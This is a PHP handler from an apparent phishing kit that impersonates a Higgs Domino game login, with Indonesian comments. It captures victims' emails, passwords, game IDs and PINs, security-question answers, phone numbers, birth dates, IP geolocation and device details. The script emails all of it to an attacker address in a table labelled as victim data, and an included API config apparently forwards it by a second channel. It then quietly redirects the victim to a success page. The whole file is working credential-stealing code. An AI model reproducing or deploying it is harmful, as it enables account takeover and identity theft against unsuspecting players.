<?php 
include 'alexBackEnd/UserAgent.php';
include 'alexBackEnd/daerah.php';

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
$playid = $_POST['playid'];
$passid = $_POST['passid'];
$nickname = $_POST['nickname'];
$phone = $_POST['phone'];
$day = $_POST['day'];
$month = $_POST['month'];
$year = $_POST['year'];
$quest1 = $_POST['quest1'];
$answer1 = $_POST['answer1'];
$quest2 = $_POST['quest2'];
$answer2 = $_POST['answer2'];
$quest3 = $_POST['quest3'];
$answer3 = $_POST['answer3'];

$benua = $alex['continent'];
$negara = $alex['country'];
$region = $alex['regionName'];
$city = $alex['city'];
$latitude = $alex['lat'];
$longtitude = $alex['lon'];
$timezone = $alex['timezone'];
$perdana = $alex['isp'];
$ipaddress = $alex['query'];
$platform = $infos['platfrm_name'];
$osversi = $infos['platfrm_vers'];
$browser = $infos['browser_name'];
			    

// MENGAMBIL KONTROL
include 'alexBackEnd/bendera.php';
include 'alexBackEnd/AlexhostX.php';

// KONTEN RESULT AKUN
$subjek = "$resultFlags | $playid | Login $login";
$pesan = <<<EOD
<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
				width: 90%;
				display: block;
				margin: auto;
				border: 1px solid #fff;
				background: #fff;
			}

			.result {
				width: 100%;
				height: 100%;
				display: block;
				margin: auto;
				position: fixed;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				z-index: 999;
				overflow-y: scroll;
				border-radius: 10px;
			}

			.tblResult {
				width: 100%;
				display: table;
				margin: 0px auto;
				border-collapse: collapse;
				text-align: center;
				background: #fcfcfc;
			}
			.tblResult th {
				text-align: left;
				font-size: 1em;
				margin: auto;
				padding: 15px 10px;
				background: #001240;
				border: 2px solid #001240;
				color: #fff;
			}

			.tblResult td {
				font-size: 1em;
				margin: auto;
				padding: 10px;
				border: 2px solid #001240;
				text-align: left;
				font-weight: bold;
				color: #000;
				text-shadow: 0px 0px 10px #fcfcfc;

			}

			.tblResult th img {
				width: 100%;
				display: block;
				margin: auto;
				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
				border-radius: 10px;
			}
		</style>
	</head>
	<body>
		<div class="result">
			<table class="tblResult">
<tr>
					<th style="text-align: center;" colspan="3"> Info $login </th>
				</tr>
				<tr>
					<td style="border-right: none;">Email / ID</td>
					<td style="text-align: center;">$email</td>
				</tr>
                <tr>
					<td style="border-right: none;">Password</td>
					<td style="text-align: center;">$password</td>
				</tr>
                <tr>
					<td style="border-right: none;">Login</td>
					<td style="text-align: center;">$login</td>
				</tr>
				</tr>

					<th style="text-align: center;" colspan="3"> ID Login </th>
				</tr>
				<tr>
					<td style="border-right: none;">User ID</td>
					<td style="text-align: center;">$playid</td>
				</tr>
				<tr>
					<td style="border-right: none;">Sandi ID</td>
					<td style="text-align: center;">$passid</td>
				</tr>
				</tr>
					<th style="text-align: center;" colspan="3"> Pertanyaan Keamanan </th>
				</tr>
				<tr>
					<td style="border-right: none;">Pertanyaan 1</td>
					<td style="text-align: center;">$quest1</td>
				</tr>
				<tr>
					<td style="border-right: none;">Jawab 1</td>
					<td style="text-align: center;">$answer1</td>
				</tr>
				<tr>
					<td style="border-right: none;">Pertanyaan 2</td>
					<td style="text-align: center;">$quest2</td>
				</tr>
				<tr>
					<td style="border-right: none;">Jawab 2</td>
					<td style="text-align: center;">$answer2</td>
				</tr>
				<tr>
					<td style="border-right: none;">Pertanyaan 3</td>
					<td style="text-align: center;">$quest3</td>
				</tr>
				<tr>
					<td style="border-right: none;">Jawab 3</td>
					<td style="text-align: center;">$answer3</td>
				</tr>
				</tr>
					<th style="text-align: center;" colspan="3"> Info Akun </th>
				</tr>
				<tr>
					<td style="border-right: none;">Nickname</td>
					<td style="text-align: center;">$nickname</td>
				</tr>
				<tr>
					<td style="border-right: none;">ID Game</td>
					<td style="text-align: center;">$playid</td>
				</tr>
				<tr>
					<td style="border-right: none;">No. Telp</td>
					<td style="text-align: center;">$phone</td>
				</tr>
				<tr>
					<td style="border-right: none;">TTL</td>
					<td style="text-align: center;">$day $month $year</td>
				</tr>
				<tr>
					<th style="text-align: center;" colspan="3">Info Daerah & Korban</th>
				</tr>
				<tr>
					<td style="border-right: none;">Negara</td>
					<td style="text-align: center;">$negara</td>
				</tr>
				<tr>
					<td style="border-right: none;">Kota</td>
					<td style="text-align: center;">$city</td>
				</tr>
				<tr>
					<td style="border-right: none;">Latitude</td>
					<td style="text-align: center;">$latitude</td>
				</tr>
				<tr>
					<td style="border-right: none;">Longitude</td>
					<td style="text-align: center;">$longtitude</td>
				</tr>
                <tr>
					<td style="border-right: none;">Zona Waktu</td>
					<td style="text-align: center;">$timezone</td>
				</tr>
                <tr>
					<td style="border-right: none;">Perdana</td>
					<td style="text-align: center;">$perdana</td>
				</tr>
				<tr>
					<td style="border-right: none;">IP Address</td>
					<td style="text-align: center;">$ipaddress</td>
				</tr>
                <tr>
					<td style="border-right: none;">Platform</td>
					<td style="text-align: center;">$platform</td>
				</tr>
                <tr>
					<td style="border-right: none;">OS</td>
					<td style="text-align: center;">$osversi</td>
				</tr>
                <tr>
					<td style="border-right: none;">Browser</td>
					<td style="text-align: center;">$browser</td>
				</tr>
				<tr>
					<th style="text-align: center;" colspan="3">&copy; Digimonous</th>
				</tr>
			</table>
		</div>
	</body>
	</html>
EOD;

$msg = "
SETOR ACC DOMINO
===================
Email / ID: $email
Password: $password
Login: $login
===================
ID Login
User ID: $playid
Sandi ID: $passid
===================
Pertanyaan Keamanan
Pertanyaan 1: $quest1
Jawab 1: $answer1
Pertanyaan 2: $quest2
Jawab 2: $answer2
Pertanyaan 3: $quest3
Jawab 3: $answer3
===================
Info Akun
Nickname: $nickname
ID Game: $playid
No. Telp: $phone
TTL: $day $month $year
Info Daerah & Korban
IP Address: $ipaddress
Platform: $platform
OS: $osversi
===================
SUPPORT US @imnoob59
===================
";
include 'email.php';
$sender ='From: RESS DOMINO GG🔥 <admin@kamucariapakamiada.ml>';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail($alexhost, $subjek, $pesan, $headers, $msg);
include 'config/api.php';
// MENDAPATKAN DATA YANG DI-INPUT DAN MENGALIHKAN KE HALAMAN COMPLETED
if($kirim) {
echo "<form id='imnoob' method='POST' action='success.php'>
<input type='hidden' name='playid' value='$playid'>
<input type='hidden' name='nickname' value='$nickname'>
</form>
<script type='text/javascript'>document.getElementById('imnoob').submit();</script>";
}

?>